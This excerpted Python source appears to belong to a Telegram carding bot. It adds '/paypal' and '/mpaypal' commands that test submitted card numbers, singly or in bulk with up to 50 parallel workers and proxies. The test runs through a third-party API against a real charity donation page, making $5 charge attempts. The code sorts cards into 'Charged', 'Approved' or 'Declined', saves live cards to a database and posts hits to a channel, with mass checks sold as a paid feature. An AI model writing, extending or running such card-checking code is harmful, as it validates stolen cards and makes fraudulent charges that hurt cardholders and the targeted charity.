# bot.py - Added PayPal Gateway (Single + Mass) - Full Integration
...
# ✅ Default PayPal site URL (can be changed via environment variable)
PAYPAL_DEFAULT_SITE = os.getenv("PAYPAL_SITE_URL", "https://mylifebloom.co/donations/support-the-lifebloom-cause/")
...
PAYPAL_PER_USER_WORKERS = 30   # NEW
MPAYPAL_PER_USER_WORKERS = 50  # NEW
...
def get_user_sem(uid, sem_type="msp"):
    ...
    if key not in _USER_SEMS:
        limits = {
            ...
            "paypal": PAYPAL_PER_USER_WORKERS,     # NEW
            "mpaypal": MPAYPAL_PER_USER_WORKERS,   # NEW
...
async def get_user_http_session(uid, purpose="general"):
    ...
    if session is None or session.closed:
        timeout_val = RZ_TIMEOUT if purpose in ("rz", "mrz") else (PAYPAL_TIMEOUT if purpose in ("paypal", "mpaypal") else API_TIMEOUT)
...
# ====================== NEW PAYPAL API ======================
def build_paypal_api_url(card, site_url, proxy_data=None, amount="5.00"):
    """
    Build PayPal API URL
    site_url: full URL of the donation/page (e.g., https://mylifebloom.co/donations/support-the-lifebloom-cause/)
    """
    url = f'{PAYPAL_API_URL}?url={quote(site_url, safe="")}&card={quote(card, safe="")}&amount={quote(amount, safe="")}'
    if proxy_data:
        un = proxy_data.get('username') or ''
        pw = proxy_data.get('password') or ''
        ip = proxy_data['ip']
...
def classify_paypal_response(resp_text):
    """
    Classify PayPal API response.
    The API returns plain text like:
    - "Approved: ..." or "Charged: ..." or "Declined: ..." or error messages.
    """
    gate = "PayPal"
    ...
    charged_keywords = [
        ...
        'money received', 'order paid', 'paid', 'success', 'captured'
    ]
    # Approved keywords (3DS, OTP, insufficient funds, etc.)
    approved_keywords = [
        'otp required', '3d authentication', 'authentication required',
        'insufficient funds', 'insufficient balance', 'cvv required',
        'ccn live', 'please authenticate'
    ]
    # Declined keywords
    declined_keywords = [
        'declined', 'card declined', 'do not honor', 'stolen card',
        'lost card', 'expired card', 'restricted card', 'fraudulent',
        'transaction not allowed', 'card not supported', 'invalid card',
        'payment failed', 'failed', 'cancelled', 'generic decline'
    ]
    
    # Check for retry-able errors
    retry_keywords = [
        'timeout', 'connection error', 'server error', '502', '503', '504',
        'bad gateway', 'service unavailable', 'gateway timeout', 'empty reply',
        'invalid json', 'network error', 'rate limited', 'too many requests',
        '429', 'try again', 'temporary error', 'overloaded'
    ]
    
    if any(k in lower for k in retry_keywords):
        return {"Response": resp_text, "Price": "-", "Gateway": gate, "Status": "RetryError"}
    
    if any(k in lower for k in charged_keywords):
        return {"Response": resp_text, "Price": "$5.00", "Gateway": gate, "Status": "Charged"}
    
    if any(k in lower for k in approved_keywords):
        return {"Response": resp_text, "Price": "$5.00", "Gateway": gate, "Status": "Approved"}
    
    if any(k in lower for k in declined_keywords):
        return {"Response": resp_text, "Price": "$5.00", "Gateway": gate, "Status": "Declined"}
    
    # Default to Declined if unknown
    return {"Response": resp_text, "Price": "$5.00", "Gateway": gate, "Status": "Declined"}


async def check_paypal_api(card, site_url=None, proxy_data=None, user_id=None, http_session=None, amount="5.00"):
    """
    Check card against PayPal API.
    site_url: the target URL (donation page). If None, uses PAYPAL_DEFAULT_SITE.
    """
    uid = user_id or "?"
    if not site_url:
        site_url = PAYPAL_DEFAULT_SITE
    try:
        url = build_paypal_api_url(card, site_url, proxy_data, amount)
        s = http_session or (await get_user_http_session(uid, "paypal"))
        async with s.get(url) as r:
            resp_text = await r.text()
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}: {resp_text[:100]}", "Price": "-", "Gateway": "PayPal", "Status": "RetryError", "card": card}
            result = classify_paypal_response(resp_text)
            result["card"] = card
            result["site"] = site_url
            return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "PayPal", "Status": "RetryError", "card": card}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": str(e)[:100], "Price": "-", "Gateway": "PayPal", "Status": "RetryError", "card": card}


async def check_paypal_with_retry(card, site_url=None, proxies_data=None, user_id=None, max_retries=3, cancel_check=None, http_session=None, amount="5.00"):
    ...
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "PayPal", "Status": "Error", "card": card}
        ...
        if proxy_data:
            ...
            sem = await get_proxy_sem(proxy_url)
            async with sem:
                result = await check_paypal_api(card, site_url, proxy_data, user_id, http_session, amount)
        else:
            result = await check_paypal_api(card, site_url, proxy_data, user_id, http_session, amount)
    ...
    if last:
        if is_card_retry_needed(last.get("Response", "")):
            last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Price": "-", "Gateway": "PayPal", "Status": "Error", "card": card}
...
async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
    try:
        ...
        if gate_type in ("RazorPay", "PayPal"):
...
{PE} <b><i>{bs('PayPal')}</i></b>   <i>{bs('NEW')}</i>
|   {PE} <code>/paypal</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/mpaypal</code> ━ <b>{bs('Mass CC')}</b>
...
# ====================== /paypal (PayPal Single) NEW ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]paypal\b'))
async def paypal_single_check(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    ...
    card = _get_card_from_event(event, rm)
    if not card: 
        return await styled_reply(event, f"{PE} <code>/paypal card|mm|yy|cvv</code>\n{PE} <i>{bs('Optionally add site URL:')} /paypal https://example.com/donate card|mm|yy|cvv</i>", emoji_ids=[CE["info"]])
    
    # Extract optional site URL from command
    ...
    if len(parts) > 1:
        ...
        if potential_url.startswith(('http://', 'https://')):
            site_url = potential_url.split()[0]  # Take the URL part
            # Remove the URL from the text to avoid being parsed as card
            # But card extraction will still work from remaining text or reply
    # If site_url not provided, use default
    if not site_url:
        site_url = PAYPAL_DEFAULT_SITE
    ...
    st = time.time()
    try:
        http_session = await get_user_http_session(uid, "paypal")
        bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
        result = await check_paypal_with_retry(card, site_url, proxies, uid, max_retries=3, http_session=http_session)
        bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), 'PayPal', result.get('Price', '$5.00')))
        msg, eid = format_rz_single_result(status, card, 'PayPal', result.get('Response', '')[:150], bi, elapsed)
        try: 
            await lm.delete()
        except: 
            pass
...
async def stop_cmd(event):
    uid = event.sender_id
    stopped_any = False
    for store in [ACTIVE_MTXT_PROCESSES, ACTIVE_MRZ_PROCESSES, ACTIVE_MPAYPAL_PROCESSES]:
        proc = store.get(uid)
...
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
    ...
    workers = MPAYPAL_PER_USER_WORKERS if sem_type == "mpaypal" else (MRZ_PER_USER_WORKERS if sem_type == "mrz" else MSP_PER_USER_WORKERS)
    ...
    async def worker(card):
        ...
        async with user_sem:
            ...
            try:
                ...
                site = result.get("site", result.get("site_url", "N/A"))
                ...
                if status == "Error": 
                    ...
                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz or gate_name == "PayPal"))
...
async def _send_mass_hit(card, result, status, uid, username, name, is_rz=False):
    ...
    try:
        ...
        try: 
            ...
            pass
        if status == "Charged":
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay" if is_rz else "PayPal" if gw == "PayPal" else "Shopify"))
    except: 
        pass
...
# ====================== /mpaypal (PayPal Mass) NEW ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mpaypal\b'))
async def mpaypal_mass_check_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    ...
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MPAYPAL_PROCESSES: 
        return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    cmd_text = re.sub(r'^[/.]mpaypal\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text: 
        content = cmd_text
        from_inline = True
    elif event.reply_to_msg_id:
        ...
        return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/mpaypal</code>\n{PE} <i>{bs('Uses default PayPal site URL. Change via PAYPAL_SITE_URL env var.')}</i>", emoji_ids=[CE["info"]])
    cards = extract_cc(content)
    if not cards: 
        return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: 
    ...
    # Use default site URL for mass check
    site_url = PAYPAL_DEFAULT_SITE
    
    async def paypal_check(card, http_session):
        return await check_paypal_with_retry(card, site_url, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MPAYPAL_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    
    if from_inline:
        ACTIVE_MPAYPAL_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MPAYPAL_PROCESSES, "stop_mpaypal", paypal_check, "PayPal", "mpaypal"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"mpaypal_pref:yes:{uid}")], [pbtn(bs("Only Charged"), f"mpaypal_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"mpaypal_{uid}"] = {"cards": cards, "proxies": proxies, "event": event, "pref_msg": pm, "site_url": site_url}


@client.on(events.CallbackQuery(pattern=rb"mpaypal_pref:(yes|no):(\d+)"))
async def mpaypal_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"mpaypal_{uid}", None)
    if not data: 
        return await event.answer(f"{bs('Expired')}!", alert=True)
    try: 
        await data["pref_msg"].delete()
    ...
    await event.answer(f"{bs('Starting')}...")
    proxies = data["proxies"]
    site_url = data.get("site_url", PAYPAL_DEFAULT_SITE)
    
    async def paypal_check(card, http_session):
        return await check_paypal_with_retry(card, site_url, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MPAYPAL_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MPAYPAL_PROCESSES, "stop_mpaypal", paypal_check, "PayPal", "mpaypal"))


@client.on(events.CallbackQuery(pattern=rb"stop_mpaypal:(\d+)"))
async def stop_mpaypal_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MPAYPAL_PROCESSES.get(puid)
    if not proc: 
        return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
...
{PE} <b>{bs('MPayPal Active')}:</b> <code>{len(ACTIVE_MPAYPAL_PROCESSES)}</code> ({MPAYPAL_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
